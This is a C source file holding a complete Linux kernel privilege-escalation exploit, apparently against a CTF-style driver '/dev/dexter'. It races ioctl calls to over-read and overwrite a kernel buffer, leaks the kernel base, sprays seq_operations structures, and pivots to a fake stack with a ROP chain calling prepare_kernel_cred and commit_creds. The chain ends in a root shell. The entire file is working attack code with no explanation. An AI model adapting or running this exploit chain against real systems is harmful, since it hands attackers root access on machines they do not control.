#define _GNU_SOURCE 
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <pthread.h>

#define commit_creds              kbase + 0x072810
#define prepare_kernel_cred       kbase + 0x0729b0
#define kpti_trampoline           kbase + 0x800e26
#define pop_rdi_ret               kbase + 0x09b0cd
#define pop_rcx_ret               kbase + 0x10d88b
#define mov_rdi_rax_movsq_ret     kbase + 0x63d0ab
#define mov_esp_39000000_ret      kbase + 0x52027a
#define DEVICE_PATH               "/dev/dexter"
#define BUFFER_SIZE               0x20
#define CMD_GET                   0xdec50001
#define CMD_SET                   0xdec50002
#define ERROR(x)                  printf("Error: %s\n", x); return -1;

typedef struct {
  char *ptr;
  size_t len;
} request_t;
request_t req;
int fd, seq_fd, win;

uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    );
}
int dexter_set(char *ptr, size_t len){
    req.ptr=ptr;
    req.len=len;
    if(ioctl(fd, CMD_SET, &req) < 0){return -1;}
    return 0;
}
int dexter_get(char *ptr, size_t len){
    req.ptr=ptr;
    req.len=len;
    if(ioctl(fd, CMD_GET, &req) < 0){return -1;}
    return 0;
}
void *race(void *arg){while(!win){req.len=(size_t)arg; } return NULL;} // we have to sleep so some "normal" requests will be set too

void overread(char *buf, size_t len){
    pthread_t th;
    char *tmp = (char *)malloc(len);
    memset(buf, 0, len);
    memset(tmp, 0, len); 
    pthread_create(&th, NULL, race, (void*)len);
    
    while(1){
        dexter_get(buf, BUFFER_SIZE);
        if(memcmp(tmp, buf, len) != 0){win = 1; break;} 
    }
    pthread_join(th, NULL);
    win = 0;
    free(tmp);
}

void overwrite(char *buf, size_t len){
    pthread_t th;
    char *tmp = (char *)malloc(len);
    while(1){
        pthread_create(&th, NULL, race, (void*)len);  
        for(int i = 0; i < 0x1000; i++){dexter_set(buf, BUFFER_SIZE);} // overwriting the victim kernel buffer
        win = 1;
        pthread_join(th, NULL);
        win = 0;
        overread(tmp, len); // read the contents of the victim kernel buffer
        if(memcmp(tmp, buf, len) == 0){break;}   // break if equal
    }
    free(tmp);
}



int main(int argc, char **argv){
    save_user_state();
    int fds[256];
    /* spray kmalloc-32: seq_operations */
    for(int i = 0; i < 128; i++){ if((fds[i]=open("/proc/self/stat", O_RDONLY)) < 0){ERROR("failed to spray..")} }
    if((fd = open(DEVICE_PATH, O_RDWR)) < 0){ERROR("failed to open the device..")}
    for(int i = 128; i < 256; i++){ if((fds[i]=open("/proc/self/stat", O_RDONLY)) < 0){ERROR("failed to spray..")} }
    if(mmap((void *) 0x39000000 -0x5000, 0x10000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_POPULATE | MAP_ANONYMOUS, -1, 0) == MAP_FAILED){ERROR("failed to map the target page..")}
    
    uint64_t payload[0x100];
    overread((char *)payload, 0x100);
    uint64_t kbase = payload[32 / sizeof(uint64_t)] - 0x170f80;
    printf("[+] found kbase: %p\n", kbase);

    uint64_t fake[200];

    uint64_t *fake_stack = (uint64_t *)0x39000000;
    *fake_stack++        = pop_rdi_ret;
    *fake_stack++        = 0;
    *fake_stack++        = prepare_kernel_cred;
    *fake_stack++        = pop_rcx_ret;
    *fake_stack++        = 0;
    *fake_stack++        = mov_rdi_rax_movsq_ret;
    *fake_stack++        = commit_creds;
    *fake_stack++        = kpti_trampoline;
    *fake_stack++        = 0;
    *fake_stack++        = 0;
    *fake_stack++        = user_rip;
    *fake_stack++        = user_cs;
    *fake_stack++        = user_rflags;
    *fake_stack++        = user_sp;
    *fake_stack++        = user_ss;
    
    payload[32 / sizeof(uint64_t)] = mov_esp_39000000_ret; // overwrite seq_operations's start routine
    overwrite((char *)payload, 0x100);
    puts("[+] seq_operations->start was overwritten successfully");
    char tmp[10];
    for(int i = 0; i < 256; i++){read(fds[i], tmp, 10);} 
    return 0;
}